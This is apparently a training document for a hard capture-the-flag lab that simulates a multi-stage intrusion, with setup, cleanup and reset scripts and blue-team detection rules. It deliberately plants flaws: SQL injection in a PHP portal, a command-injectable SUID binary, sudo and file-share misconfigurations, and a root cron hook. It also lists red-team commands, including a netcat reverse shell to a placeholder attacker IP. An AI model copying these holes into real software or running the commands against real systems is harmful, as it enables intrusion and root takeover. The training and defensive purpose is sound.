# Hard CTF Scenario 2: Multi-Stage Attack

## Overview
Complex multi-vector attack scenario combining web exploitation, lateral movement, and privilege escalation. Simulates realistic APT-style attack chain.

## Scenario Details
- **Difficulty**: Hard
- **Attack Vectors**: Web exploitation → lateral movement → privilege escalation → persistence
- **Skills Tested**: Attack chaining, persistence techniques, network pivoting, comprehensive exploitation
- **Expected Time**: 60-90 minutes

## Setup

### Prerequisites
- Multiple services (web, SSH, database)
- Multiple user accounts
- Network segmentation simulation
- File sharing services

### Setup Script
```bash
#!/bin/bash
# setup_multi_stage_attack.sh

echo "[+] Setting up Multi-Stage Attack scenario..."

# Install required packages
sudo apt-get update -qq
sudo apt-get install -y apache2 mysql-server php php-mysql openssh-server samba nfs-kernel-server

# Start services
sudo systemctl start apache2 mysql ssh smbd nmbd nfs-kernel-server
sudo systemctl enable apache2 mysql ssh smbd nmbd nfs-kernel-server

# === STAGE 1: WEB APPLICATION VULNERABILITY ===

# Set up MySQL database
sudo mysql -e "CREATE DATABASE company_db;"
sudo mysql -e "CREATE USER 'web_user'@'localhost' IDENTIFIED BY 'web_pass_2023';"
sudo mysql -e "GRANT ALL PRIVILEGES ON company_db.* TO 'web_user'@'localhost';"
sudo mysql -e "FLUSH PRIVILEGES;"

# Create database with employee data
sudo mysql company_db << 'EOF'
CREATE TABLE employees (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(100) NOT NULL,
    email VARCHAR(100),
    department VARCHAR(50),
    access_level VARCHAR(20)
);

CREATE TABLE documents (
    id INT AUTO_INCREMENT PRIMARY KEY,
    filename VARCHAR(100),
    content TEXT,
    access_level VARCHAR(20)
);

INSERT INTO employees (username, password, email, department, access_level) VALUES
('jsmith', 'password123', 'jsmith@company.com', 'IT', 'admin'),
('mjones', 'letmein456', 'mjones@company.com', 'HR', 'user'),
('bwilson', 'company2023', 'bwilson@company.com', 'Finance', 'user'),
('admin', 'P@ssw0rd!2023', 'admin@company.com', 'IT', 'superuser');

INSERT INTO documents (filename, content, access_level) VALUES
('network_diagram.txt', 'Internal network: 192.168.1.0/24\nFile server: 192.168.1.100\nDatabase server: 192.168.1.50', 'admin'),
('employee_credentials.txt', 'SSH Access:\njsmith:JSmith_SSH_2023\nmjones:MJones_SSH_2023', 'admin'),
('flag1.txt', 'APTL{w3b_4pp_c0mpr0m1s3d}', 'superuser');
EOF

# Create vulnerable PHP application
sudo mkdir -p /var/www/html/portal
cat << 'EOF' | sudo tee /var/www/html/portal/index.php > /dev/null
<!DOCTYPE html>
<html>
<head>
    <title>Company Employee Portal</title>
    <style>
        body { font-family: Arial; margin: 50px; background: #f5f5f5; }
        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 8px; }
        input[type=text], input[type=password] { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; }
        input[type=submit] { background: #007cba; color: white; padding: 12px 30px; border: none; cursor: pointer; border-radius: 4px; }
        .error { color: red; background: #ffe6e6; padding: 10px; margin: 10px 0; }
        .success { color: green; background: #e6ffe6; padding: 10px; margin: 10px 0; }
        .documents { background: #f9f9f9; padding: 15px; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Employee Portal Login</h2>
        <form method="POST" action="">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login" name="submit">
        </form>
        
        <?php
        if (isset($_POST['submit'])) {
            $servername = "localhost";
            $db_username = "web_user";
            $db_password = "web_pass_2023";
            $dbname = "company_db";
            
            $conn = new mysqli($servername, $db_username, $db_password, $dbname);
            
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            $username = $_POST['username'];
            $password = $_POST['password'];
            
            // VULNERABLE SQL QUERY
            $sql = "SELECT * FROM employees WHERE username = '$username' AND password = '$password'";
            $result = $conn->query($sql);
            
            if ($result->num_rows > 0) {
                $user = $result->fetch_assoc();
                echo "<div class='success'>Welcome, " . htmlspecialchars($user['username']) . "!</div>";
                echo "<div class='success'>Department: " . htmlspecialchars($user['department']) . "</div>";
                echo "<div class='success'>Access Level: " . htmlspecialchars($user['access_level']) . "</div>";
                
                // Show documents based on access level
                $doc_sql = "SELECT * FROM documents WHERE access_level = '" . $user['access_level'] . "' OR access_level = 'user'";
                $doc_result = $conn->query($doc_sql);
                
                if ($doc_result->num_rows > 0) {
                    echo "<div class='documents'><h3>Available Documents:</h3>";
                    while ($doc = $doc_result->fetch_assoc()) {
                        echo "<strong>" . htmlspecialchars($doc['filename']) . "</strong><br>";
                        echo "<pre>" . htmlspecialchars($doc['content']) . "</pre><hr>";
                    }
                    echo "</div>";
                }
            } else {
                echo "<div class='error'>Invalid credentials!</div>";
                // Show SQL error for debugging
                if ($conn->error) {
                    echo "<div style='background: #ffe6e6; padding: 10px; margin: 10px 0; font-size: 12px;'>";
                    echo "<strong>Debug:</strong> " . $conn->error;
                    echo "</div>";
                }
            }
            
            $conn->close();
        }
        ?>
        
        <hr>
        <p><small>For IT support, contact: support@company.com</small></p>
    </div>
</body>
</html>
EOF

# === STAGE 2: LATERAL MOVEMENT TARGET ===

# Create SSH users with keys and passwords
sudo useradd -m -s /bin/bash jsmith
sudo useradd -m -s /bin/bash mjones
sudo useradd -m -s /bin/bash bwilson
sudo useradd -m -s /bin/bash fileserver

echo "jsmith:JSmith_SSH_2023" | sudo chpasswd
echo "mjones:MJones_SSH_2023" | sudo chpasswd
echo "bwilson:Company_Finance_2023" | sudo chpasswd
echo "fileserver:FileServer_Admin_2023" | sudo chpasswd

# Create SSH keys for persistence
sudo -u jsmith ssh-keygen -t rsa -b 2048 -f /home/jsmith/.ssh/id_rsa -N ""
sudo -u mjones ssh-keygen -t rsa -b 2048 -f /home/mjones/.ssh/id_rsa -N ""

# === STAGE 3: FILE SHARING AND NETWORK DISCOVERY ===

# Set up NFS share with sensitive data
sudo mkdir -p /srv/nfs/shared
sudo mkdir -p /srv/nfs/finance

echo "APTL{l4t3r4l_m0v3m3nt_succ3ss}" | sudo tee /srv/nfs/shared/flag2.txt > /dev/null
echo "Network infrastructure details..." | sudo tee /srv/nfs/shared/network_info.txt > /dev/null
echo "Financial records and sensitive data" | sudo tee /srv/nfs/finance/financial_data.txt > /dev/null

# Configure NFS exports
cat << 'EOF' | sudo tee /etc/exports > /dev/null
/srv/nfs/shared *(rw,sync,no_subtree_check,no_root_squash)
/srv/nfs/finance *(rw,sync,no_subtree_check,root_squash)
EOF

sudo exportfs -ra

# Set up Samba share
cat << 'EOF' | sudo tee -a /etc/samba/smb.conf > /dev/null

[shared]
   path = /srv/samba/shared
   browseable = yes
   writable = yes
   guest ok = yes
   read only = no
   force user = nobody

[finance]
   path = /srv/samba/finance
   valid users = bwilson
   writable = yes
   browseable = yes
EOF

sudo mkdir -p /srv/samba/shared /srv/samba/finance
echo "APTL{f1l3_sh4r3_4cc3ss}" | sudo tee /srv/samba/shared/flag3.txt > /dev/null
echo "Budget and financial planning documents" | sudo tee /srv/samba/finance/budget_2023.txt > /dev/null

sudo smbpasswd -a bwilson << 'EOF'
Company_Finance_2023
Company_Finance_2023
EOF

sudo systemctl restart smbd nmbd

# === STAGE 4: PRIVILEGE ESCALATION SETUP ===

# Create sudo misconfiguration
echo "jsmith ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart apache2" | sudo tee -a /etc/sudoers > /dev/null
echo "mjones ALL=(ALL) NOPASSWD: /usr/bin/find /var/log" | sudo tee -a /etc/sudoers > /dev/null

# Create SUID binary for advanced escalation
cat << 'EOF' > /tmp/file_backup.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <file_to_backup>\n", argv[0]);
        return 1;
    }
    
    char command[512];
    snprintf(command, sizeof(command), "/bin/cp %s /var/backups/", argv[1]);
    
    setuid(0);
    system(command);  // Command injection vulnerability
    
    return 0;
}
EOF

sudo gcc /tmp/file_backup.c -o /usr/local/bin/file_backup
sudo chmod 4755 /usr/local/bin/file_backup
sudo rm /tmp/file_backup.c

# === STAGE 5: FINAL FLAG AND PERSISTENCE ===

echo "APTL{pr1v1l3g3_3sc4l4t10n_m4st3r}" | sudo tee /root/final_flag.txt > /dev/null
sudo chmod 600 /root/final_flag.txt

# Create cron job for persistence demonstration
cat << 'EOF' | sudo tee /etc/cron.d/system_update > /dev/null
# System update check every 5 minutes
*/5 * * * * root /bin/bash -c 'if [ -f /tmp/.persistence ]; then /bin/bash /tmp/.persistence; fi'
EOF

# Set permissions
sudo chown -R www-data:www-data /var/www/html/
sudo chmod -R 755 /var/www/html/
sudo chmod -R 755 /srv/nfs/
sudo chmod -R 755 /srv/samba/

echo "[+] Multi-Stage Attack scenario deployed!"
echo ""
echo "=== ATTACK CHAIN OVERVIEW ==="
echo "Stage 1: Web Application (http://localhost/portal/)"
echo "  - SQL injection vulnerability"
echo "  - Credential disclosure in documents"
echo ""
echo "Stage 2: Lateral Movement"
echo "  - SSH access with discovered credentials"
echo "  - User accounts: jsmith, mjones, bwilson"
echo ""
echo "Stage 3: Network Discovery"
echo "  - NFS shares: /srv/nfs/shared, /srv/nfs/finance"
echo "  - SMB shares: //localhost/shared, //localhost/finance"
echo ""
echo "Stage 4: Privilege Escalation"
echo "  - Sudo misconfigurations"
echo "  - SUID binary: /usr/local/bin/file_backup"
echo ""
echo "Stage 5: Persistence & Final Flag"
echo "  - Cron-based persistence mechanism"
echo "  - Final flag: /root/final_flag.txt"
echo ""
echo "=== FLAGS TO COLLECT ==="
echo "Flag 1: Web application database"
echo "Flag 2: NFS share access"
echo "Flag 3: SMB share access"
echo "Flag 4: Root privilege escalation"
```

### Manual Setup Steps
1. Install LAMP stack, SSH, Samba, NFS
2. Create vulnerable web application with SQL injection
3. Set up multiple user accounts with SSH access
4. Configure file shares (NFS/SMB) with sensitive data
5. Create privilege escalation vectors
6. Place flags throughout the attack chain

## Attack Methodology

### Expected Attack Chain
1. **Initial Compromise**:
   - Web application SQL injection
   - Extract credentials from database
2. **Lateral Movement**:
   - SSH to user accounts with discovered credentials
   - Network discovery and enumeration
3. **File Share Access**:
   - Mount NFS/SMB shares
   - Extract additional flags and information
4. **Privilege Escalation**:
   - Exploit sudo misconfigurations
   - SUID binary command injection
5. **Persistence**:
   - Establish backdoor via cron jobs
   - Maintain access for investigation

### Key Commands Red Team Will Use
```bash
# Stage 1: Web exploitation
dirb http://<target_ip>/
sqlmap -u "http://<target_ip>/portal/" --data="username=admin&password=test&submit=Login" --dbs
sqlmap -u "http://<target_ip>/portal/" --data="username=admin&password=test&submit=Login" -D company_db --tables
sqlmap -u "http://<target_ip>/portal/" --data="username=admin&password=test&submit=Login" -D company_db -T documents --dump

# Stage 2: Lateral movement
ssh jsmith@<target_ip>
ssh mjones@<target_ip>

# Stage 3: Network discovery
nmap -sS <target_network>/24
showmount -e <target_ip>
smbclient -L //<target_ip>

# Mount shares
sudo mount -t nfs <target_ip>:/srv/nfs/shared /mnt/nfs
smbclient //<target_ip>/shared -U guest

# Stage 4: Privilege escalation
sudo -l
find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/file_backup "/etc/passwd; /bin/sh"

# Stage 5: Persistence
echo '#!/bin/bash' > /tmp/.persistence
echo 'nc -e /bin/sh <attacker_ip> 4444' >> /tmp/.persistence
chmod +x /tmp/.persistence
```

## Blue Team Detection Signatures

### Log Patterns to Monitor
```
# Web application attacks
- SQL injection patterns in POST requests
- Database error messages in HTTP responses
- Multiple parameter manipulation attempts

# Lateral movement
- SSH logins from internal IPs
- Multiple failed then successful authentications
- Account usage outside normal hours

# File share access
- NFS mount operations
- SMB authentication attempts
- Unusual file access patterns

# Privilege escalation
- Sudo command executions
- SUID binary executions with unusual arguments
- Process spawning from web applications
```

### Detection Rules
```
# SQL injection detection
POST data contains: UNION SELECT, information_schema, OR 1=1

# Credential extraction
Large response sizes from login endpoints
Database queries to sensitive tables (employees, documents)

# SSH brute force success
Multiple failed SSH attempts followed by success

# Lateral movement indicators
SSH connections between internal hosts
File share mounting operations
Network scanning from compromised hosts

# Privilege escalation
sudo: jsmith : COMMAND=/usr/bin/systemctl restart apache2
Process: /usr/local/bin/file_backup with suspicious arguments

# Persistence establishment
File creation in /tmp/.persistence
Cron job execution of suspicious scripts
```

## Cleanup

### Cleanup Script
```bash
#!/bin/bash
# cleanup_multi_stage_attack.sh

echo "[+] Cleaning up Multi-Stage Attack scenario..."

# Stop services
sudo systemctl stop apache2 mysql ssh smbd nmbd nfs-kernel-server

# Remove users
sudo userdel -r jsmith 2>/dev/null
sudo userdel -r mjones 2>/dev/null
sudo userdel -r bwilson 2>/dev/null
sudo userdel -r fileserver 2>/dev/null

# Remove web application
sudo rm -rf /var/www/html/portal/

# Remove database
sudo mysql -e "DROP DATABASE IF EXISTS company_db;"
sudo mysql -e "DROP USER IF EXISTS 'web_user'@'localhost';"

# Remove file shares
sudo umount /srv/nfs/shared 2>/dev/null
sudo rm -rf /srv/nfs/
sudo rm -rf /srv/samba/

# Restore configurations
sudo sed -i '/\/srv\/nfs/d' /etc/exports
sudo sed -i '/\[shared\]/,$d' /etc/samba/smb.conf

# Remove sudo entries
sudo sed -i '/jsmith ALL=(ALL) NOPASSWD:/d' /etc/sudoers
sudo sed -i '/mjones ALL=(ALL) NOPASSWD:/d' /etc/sudoers

# Remove SUID binary
sudo rm -f /usr/local/bin/file_backup

# Remove cron job
sudo rm -f /etc/cron.d/system_update

# Remove flags and temp files
sudo rm -f /root/final_flag.txt
sudo rm -f /tmp/.persistence

# Restart services with clean config
sudo systemctl restart smbd nmbd nfs-kernel-server

echo "[+] Multi-Stage Attack scenario cleaned up!"
```

### Manual Cleanup Steps
1. Stop all services
2. Remove user accounts and SSH keys
3. Remove web application and database
4. Remove file shares and configurations
5. Remove privilege escalation vectors
6. Remove persistence mechanisms
7. Clear all flags and temporary files

## Reset to Basic State

### Reset Script
```bash
#!/bin/bash
# reset_multi_stage_attack.sh

echo "[+] Resetting Multi-Stage Attack to basic state..."

# Run cleanup first
./cleanup_multi_stage_attack.sh

# Wait for services to stop
sleep 10

# Run setup again
./setup_multi_stage_attack.sh

echo "[+] Multi-Stage Attack scenario reset complete!"
```

## Investigation Opportunities

### For Blue Team Analysis
- Complete attack chain reconstruction
- Multi-vector correlation analysis
- Persistence mechanism detection
- Lateral movement pattern analysis
- Data exfiltration identification
- Timeline analysis across multiple systems

### Advanced Analysis Techniques
- Attack graph construction
- Indicator of compromise (IOC) development
- Attribution analysis
- Impact assessment
- Recovery planning
- Lessons learned documentation

### Learning Objectives
- Advanced persistent threat (APT) simulation
- Complex incident response
- Multi-system forensics
- Attack pattern recognition
- Defense in depth evaluation
- Threat hunting techniques

## Security Notes
- Simulates realistic APT attack chain
- Contains multiple vulnerability types for comprehensive training
- Should only be deployed in isolated lab environments
- Provides realistic defensive training scenarios
- Demonstrates importance of layered security controls

## Scenario Variations

### Alternative Attack Paths
- **Phishing Entry**: Email with malicious attachment
- **Insider Threat**: Compromised employee account
- **Supply Chain**: Compromised third-party component
- **Zero-Day**: Custom exploit development

### Advanced Persistence
- **Registry Manipulation** (Windows variant)
- **Service Installation**
- **Bootkit Installation**
- **Firmware Modification**

This scenario provides the most comprehensive training for both red and blue teams, simulating realistic enterprise compromise scenarios.